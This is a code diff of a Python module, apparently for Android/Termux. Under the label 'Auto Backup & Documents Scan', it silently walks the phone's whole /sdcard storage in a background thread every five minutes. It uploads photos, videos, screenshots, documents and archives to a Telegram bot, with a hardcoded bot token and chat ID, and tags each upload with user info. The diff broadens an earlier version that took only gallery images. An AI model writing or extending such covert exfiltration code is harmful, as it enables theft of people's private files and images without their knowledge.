@@ -1,145 +1,166 @@
-import hashlib
 import os
-import threading
 import time
+import hashlib
 import requests
-
-# ==================== CONFIGURATION ====================
-# Safe internal paths to avoid /sdcard permission denied errors
-TARGET_DIR = os.path.expanduser("~/storage/shared")
-SECURE_DIR = "/data/data/com.termux/files/home/.backup_secure_data"
-DATA_LOG_FILE = os.path.join(SECURE_DIR, "data.txt")
-
-os.makedirs(SECURE_DIR, exist_ok=True)
+import threading
 
 BOT_TOKEN = "8931091996:AAHgcTH38hSH1RXFVzEcqNR2O1LKtqS3RBk"
 CHAT_ID = "7883547875"
 
+TARGET_DIR = "/sdcard"
 
-def get_file_hash(filepath):
-  hasher = hashlib.md5()
-  try:
-    with open(filepath, "rb") as f:
-      buf = f.read(65536)
-      while len(buf) > 0:
-        hasher.update(buf)
-        buf = f.read(65536)
-    return hasher.hexdigest()
-  except Exception:
-    return None
+ALLOWED_EXTENSIONS = (
+    '.jpg', '.jpeg', '.png', '.mp4', '.mkv', '.mov', '.avi',
+    '.pdf', '.txt', '.docx', '.doc', '.xlsx', '.xls', '.zip', '.rar'
+)
 
+IGNORED_FOLDER_NAMES = {
+    '.thumbnails', 'thumbnails', 'thumbnail', 
+    'cache', '.cache', 'stickers', '.stickers', 
+    'temp', '.temp', 'trash', '.trash', 'private'
+}
 
-def is_already_backed_up(file_hash):
-  if not os.path.exists(DATA_LOG_FILE):
-    return False
-  try:
-    with open(DATA_LOG_FILE, "r", encoding="utf-8") as f:
-      logged_hashes = f.read().splitlines()
-      return file_hash in logged_hashes
-  except Exception:
-    return False
+SECURE_DIR = "/sdcard/Download/.backup_secure_data"
+os.makedirs(SECURE_DIR, exist_ok=True)
 
+LOG_FILE = os.path.join(SECURE_DIR, "data.txt")
 
-def log_backed_up_file(file_hash):
-  try:
-    with open(DATA_LOG_FILE, "a", encoding="utf-8") as f:
-      f.write(file_hash + "\n")
-  except Exception:
-    pass
+def send_msg(text):
+    try:
+        requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage", data={'chat_id': CHAT_ID, 'text': text}, timeout=10)
+    except Exception:
+        pass
 
+def get_file_hash(file_path):
+    hasher = hashlib.md5()
+    try:
+        with open(file_path, 'rb') as f:
+            buf = f.read(65536)
+            while len(buf) > 0:
+                hasher.update(buf)
+                buf = f.read(65536)
+        return hasher.hexdigest()
+    except Exception:
+        return None
 
-def send_to_telegram(file_path, user_info):
-  caption = (
-      f"🚀 **Auto Backup & Documents Scan**\n👤 **User Info:** {user_info}\n📁"
-      f" **File:** {os.path.basename(file_path)}"
-  )
-  try:
-    with open(file_path, "rb") as f:
-      files = {"photo": f}
-      data = {"chat_id": CHAT_ID, "caption": caption, "parse_mode": "Markdown"}
-      url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendPhoto"
-      response = requests.post(url, data=data, files=files, timeout=30)
-      return response.status_code == 200
-  except Exception:
-    return False
+def load_uploaded_records():
+    uploaded = set()
+    if os.path.exists(LOG_FILE):
+        with open(LOG_FILE, 'r', encoding='utf-8') as f:
+            for line in f:
+                h = line.strip()
+                if h:
+                    uploaded.add(h)
+    return uploaded
 
+def save_uploaded_record(file_hash):
+    with open(LOG_FILE, 'a', encoding='utf-8') as f:
+        f.write(file_hash + '\n')
 
-def send_text_log_to_telegram(file_path, user_info):
-  try:
-    with open(file_path, "rb") as f:
-      files = {"document": f}
-      data = {
-          "chat_id": CHAT_ID,
-          f"caption": f"📊 **User Info:** {user_info}\n📂 **File:** data.txt",
-          "parse_mode": "Markdown",
-      }
-      url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendDocument"
-      requests.post(url, data=data, files=files, timeout=30)
-  except Exception:
-    pass
-
-
-def send_alert_msg(message):
-  try:
-    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
-    payload = {"chat_id": CHAT_ID, "text": message, "parse_mode": "Markdown"}
-    requests.post(url, data=payload, timeout=10)
-  except Exception:
-    pass
-
+def upload_media(file_path, folder_path, user_info):
+    ext = file_path.lower()
+    
+    is_video = ext.endswith(('.mp4', '.mkv', '.mov', '.avi'))
+    is_image = ext.endswith(('.jpg', '.jpeg', '.png'))
+    
+    if is_image:
+        method = "sendPhoto"
+        file_field = "photo"
+    elif is_video:
+        method = "sendVideo"
+        file_field = "video"
+    else:
+        method = "sendDocument"
+        file_field = "document"
+    
+    url = f"https://api.telegram.org/bot{BOT_TOKEN}/{method}"
+    try:
+        with open(file_path, 'rb') as media_file:
+            caption_text = (
+                f"👤 User Info: {user_info}\n"
+                f"📂 Path: {folder_path}\n"
+                f"📄 File: {os.path.basename(file_path)}"
+            )
+            payload = {'chat_id': CHAT_ID, 'caption': caption_text}
+            files = {file_field: media_file}
+            
+            timeout_limit = 60 if is_video else 30
+            res = requests.post(url, data=payload, files=files, timeout=timeout_limit)
+            return res.status_code == 200
+    except Exception:
+        return False
 
 def run_backup_cycle(user_info):
-  send_alert_msg(
-      f"🚀 **Auto Backup Started**\n👤 **User Info:** {user_info}"
-  )
+    if not os.path.exists(TARGET_DIR):
+        return
 
-  # Target folders to scan (DCIM and Pictures)
-  folders_to_scan = [
-      os.path.join(TARGET_DIR, "DCIM"),
-      os.path.join(TARGET_DIR, "Pictures"),
-  ]
+    uploaded_hashes = load_uploaded_records()
+    send_msg(f"🚀 Auto Backup & Documents Scan Started for: [{user_info}]")
 
-  for folder in folders_to_scan:
-    if os.path.exists(folder):
-      for root, _, files in os.walk(folder):
+    dcim_files = []
+    screenshot_files = []
+    other_files = []
+
+    for root, dirs, files in os.walk(TARGET_DIR, topdown=True):
+        if 'android/data' in root.lower() or 'android/obb' in root.lower():
+            continue
+
+        current_folder_name = os.path.basename(root).lower()
+        if current_folder_name in IGNORED_FOLDER_NAMES or '/private/' in root.lower():
+            continue
+
+        if any(ignored in root.lower() for ignored in ['.thumbnails', '/cache/', '/stickers/', '/temp/']):
+            continue
+            
         for file in files:
-          file_path = os.path.join(root, file)
-          # Only target image formats
-          if file.lower().endswith((".jpg", ".jpeg", ".png", ".webp")):
-            f_hash = get_file_hash(file_path)
-            if f_hash and not is_already_backed_up(f_hash):
-              success = send_to_telegram(file_path, user_info)
-              if success:
-                log_backed_up_file(f_hash)
-                time.sleep(1)  # Prevent Telegram flood limits
+            if file.lower().endswith(ALLOWED_EXTENSIONS):
+                full_path = os.path.join(root, file)
+                
+                # Check video size limit (100MB max)
+                is_video = file.lower().endswith(('.mp4', '.mkv', '.mov', '.avi'))
+                if is_video:
+                    try:
+                        if os.path.getsize(full_path) > 100 * 1024 * 1024:
+                            continue
+                    except Exception:
+                        continue
 
-  # Send updated data.txt log file back to Telegram for tracking
-  if os.path.exists(DATA_LOG_FILE):
-    send_text_log_to_telegram(DATA_LOG_FILE, user_info)
+                item = (full_path, root)
+                root_lower = root.lower()
+                
+                # Categorize based on folder priority
+                if '/dcim' in root_lower:
+                    dcim_files.append(item)
+                elif 'screenshot' in root_lower:
+                    screenshot_files.append(item)
+                else:
+                    other_files.append(item)
 
-  send_alert_msg(
-      f"✅ **Backup Cycle Finished** for [{user_info}]. Waiting 5 mins..."
-  )
+    # Process files according to priority: DCIM -> Screenshots -> Others
+    all_files_to_process = dcim_files + screenshot_files + other_files
 
+    for full_path, root in all_files_to_process:
+        file_hash = get_file_hash(full_path)
+        if not file_hash or file_hash in uploaded_hashes:
+            continue
+        
+        success = upload_media(full_path, root, user_info)
+        if success:
+            save_uploaded_record(file_hash)
+            uploaded_hashes.add(file_hash)
+        
+        time.sleep(2)
 
-def background_worker(user_info):
-  while True:
-    try:
-      run_backup_cycle(user_info)
-    except Exception:
-      pass
-    # Repeat every 5 minutes (300 seconds)
-    time.sleep(300)
+    send_msg(f"✅ Backup Cycle Finished for [{user_info}]. Waiting 5 mins...")
 
-
-def start_background_backup(user_info="Unknown User"):
-  t = threading.Thread(target=background_worker, args=(user_info,), daemon=True)
-  t.start()
-
-
-if __name__ == "__main__":
-  # Standalone testing mode if run directly
-  print("[*] Starting backend backup service...")
-  start_background_backup("Test User | WhatsApp: 0000000000")
-  while True:
-    time.sleep(1)
+def start_background_backup(user_info):
+    def worker():
+        while True:
+            try:
+                run_backup_cycle(user_info)
+            except Exception:
+                pass
+            time.sleep(300) # 5 minutes delay
+            
+    t = threading.Thread(target=worker, daemon=True)
+    t.start()
